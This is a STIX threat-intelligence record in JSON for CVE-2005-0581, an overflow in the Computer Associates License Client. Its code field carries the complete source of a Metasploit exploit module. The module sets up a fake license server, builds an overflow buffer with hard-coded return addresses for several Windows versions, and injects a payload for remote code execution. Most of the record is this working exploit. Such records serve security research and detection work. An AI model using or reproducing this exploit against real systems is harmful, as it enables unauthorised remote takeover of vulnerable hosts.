{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--fc9f5580-8e7b-410b-a602-4b91703267d1",
    "created": "2024-08-14T16:48:44.323714Z",
    "modified": "2024-08-14T16:48:44.323718Z",
    "name": "Computer Associates License Client GETCONFIG Overflow",
    "description": " This module exploits a vulnerability in the CA License Client service. This exploit will only work if your IP address can be resolved from the target system point of view. This can be accomplished on a local network by running the 'nmbd' service that comes with Samba. If you are running this exploit from Windows and do not filter udp port 137, this should not be a problem (if the target is on the same network segment). Due to the bugginess of the software, you are only allowed one connection to the agent port before it starts ignoring you. If it wasn't for this issue, it would be possible to repeatedly exploit this bug. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/license/calicclnt_getconfig.rb",
            "external_id": "calicclnt_getconfig.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2005-0581"
        },
        {
            "source_name": "reference",
            "url": "http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=213"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'\t\t=> 'Computer Associates License Client GETCONFIG Overflow',\n      'Description'\t=> %q{\n          This module exploits a vulnerability in the CA License Client\n        service. This exploit will only work if your IP address can be\n        resolved from the target system point of view. This can be\n        accomplished on a local network by running the 'nmbd' service\n        that comes with Samba. If you are running this exploit from\n        Windows and do not filter udp port 137, this should not be a\n        problem (if the target is on the same network segment). Due to\n        the bugginess of the software, you are only allowed one connection\n        to the agent port before it starts ignoring you. If it wasn't for this\n        issue, it would be possible to repeatedly exploit this bug.\n      },\n      'Author' =>\n        [\n          'hdm', # original msf v2 module\n          'aushack', # msf v3 port :)\n        ],\n      'License' => MSF_LICENSE,\n      'References'\t=>\n        [\n          [ 'CVE', '2005-0581' ],\n          [ 'OSVDB', '14389' ],\n          [ 'BID', '12705' ],\n          [ 'URL', 'http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=213' ],\n        ],\n      'Privileged' => true,\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload' =>\n        {\n          'Space'\t=> 600,\n          'BadChars' => \"\\x00\\x20\",\n          'StackAdjustment' => -3500,\n\n        },\n      'Platform'\t=> 'win',\n      'Targets' =>\n        [\n          # As much as I would like to return back to the DLL or EXE,\n          # all of those modules have a leading NULL in the\n          # loaded @ address :(\n          # name, jmp esi, writable, jmp edi\n          #['Automatic', {} ],\n          #\n          # aushack - tested OK Windows XP English SP0-1 only 20100214\n          ['Windows 2000 English',\t{ 'Rets' => [ 0x750217ae, 0x7ffde0cc, 0x75021421 ] } ], # ws2help.dll esi + peb + edi\n          ['Windows XP English SP0-1',\t{ 'Rets' => [ 0x71aa16e5, 0x7ffde0cc, 0x71aa19e8 ] } ], # ws2help.dll esi + peb + edi\n          ['Windows XP English SP2',\t{ 'Rets' => [ 0x71aa1b22, 0x71aa5001, 0x71aa1e08 ] } ], # ws2help.dll esi + .data + edi\n          ['Windows 2003 English SP0',\t{ 'Rets' => [ 0x71bf175f, 0x7ffde0cc, 0x71bf1a2c ] } ], # ws2help.dll esi + peb + edi\n        ],\n      'DisclosureDate' => '2005-03-02'))\n\n    register_options(\n      [\n        Opt::RPORT(10203),\n        OptPort.new('SRVPORT', [ true, \"Fake CA License Server Port\", 10202 ]),\n      ])\n  end\n\n  #def check\n    # It is possible to check, but due to a software bug, checking prevents exploitation\n  #end\n\n  def exploit\n    if (connect)\n      sock.put(\"A0 GETSERVER<EOM>\\n\")\n      print_status(\"Initial packet sent to remote agent...\")\n      disconnect\n\n      fakecaservice = Rex::Socket::TcpServer.create(\n        'LocalHost' => '0.0.0.0',\n        'LocalPort' => datastore['SRVPORT'],\n        'SSL'       => false,\n        'Context'   =>\n          {\n            'Msf'        => framework,\n            'MsfExploit' => self,\n          })\n\n      add_socket(fakecaservice)\n\n      fakecaservice.start\n      print_status(\"Waiting for the license agent to connect back...\")\n      begin\n        Timeout.timeout(3) do\n          done = false\n          while (not done and session = fakecaservice.accept)\n            print_status(\"Accepted connection from agent #{Rex::Socket.source_address(rhost)}..\")\n            session.put(\"A0 GETCONFIG SELF 0<EOM>\")\n            req = session.recvfrom(2000)[0]\n            next if not req\n            next if req.empty?\n\n            if (req =~ /OS\\<([^\\>]+)/)\n              print_status(\"Target reports OS: #{$1}\")\n            end\n\n            # exploits two different versions at once >:-)\n            # 144 -> return address of esi points to string middle\n            # 196 -> return address of edi points to string beginning\n            # 148 -> avoid exception by patching with writable address\n            # 928 -> seh handler (not useful under XP SP2)\n            buff = rand_text_alphanumeric(900)\n            buff[142, 2] = Rex::Arch::X86.jmp_short(8) \t\t# jmp over addresses\n            buff[144, 4] = [target['Rets'][0]].pack('V') \t\t# jmp esi\n            buff[148, 4] = [target['Rets'][1]].pack('V')\t\t# writable address\n            buff[194, 2] = Rex::Arch::X86.jmp_short(4)\t\t# jmp over address\n            buff[196, 4] = [target['Rets'][2]].pack('V')\t\t# jmp edi\n            buff[272, payload.encoded.length] = payload.encoded\n\n            sploit = \"A0 GETCONFIG SELF #{buff}<EOM>\"\n            session.put(sploit)\n            session.close\n          end\n        end\n      ensure\n        handler\n        fakecaservice.close\n        return\n      end\n    end\n  end\nend\n\n=begin\neTrust: A0 GCR HOSTNAME<XXX>HARDWARE<xxxxxx>LOCALE<English>IDENT1<unknown>IDENT2<unknown>IDENT3<unknown>IDENT4<unknown>OS<Windows_NT 5.2>OLFFILE<0 0 0>SERVER<RMT>VERSION<0 1.61.0>NETWORK<192.168.3.22 unknown 255.255.255.0>MACHINE<PC_686_1_2084>CHECKSUMS<0 0 0 0 0 0 0 00 0 0 0>RMTV<1.3.1><EOM>\nBrightStor: A0 GCR HOSTNAME<XXX>HARDWARE<xxxxxx>LOCALE<English>IDENT1<unknown>IDENT2<unknown>IDENT3<unknown>IDENT4<unknown>OS<Windows_NT 5.1>OLFFILE<0 0 0>SERVER<RMT>VERSION<3 1.54.0>NETWORK<11.11.11.111 unknown 255.255.255.0>MACHINE<DESKTOP>CHECKSUMS<0 0 0 0 0 0 0 0 0 0 0 0>RMTV<1.00><EOM>\nlic98rmt.exe v0.1.0.15: A0 GCR HOSTNAME<XXX>HARDWARE<xxxxxx>LOCALE<English>IDENT1<unknown>IDENT2<unknown>IDENT3<unknown>IDENT4<unknown>OS<Windows_NT 5.1>OLFFILE<0 0 0>SERVER<RMT>VERSION<3 1.61.0>NETWORK<192.168.139.128 unknown 255.255.255.0>MACHINE<DESKTOP>CHECKSUMS<0 0 0 0 0 0 0 0 0 0 0 0>RMTV<1.00><EOM>\n=end\n",
    "x_mitre_disclosure_date": "2005-03-02",
    "x_mitre_platforms": [
        "win'"
    ]
}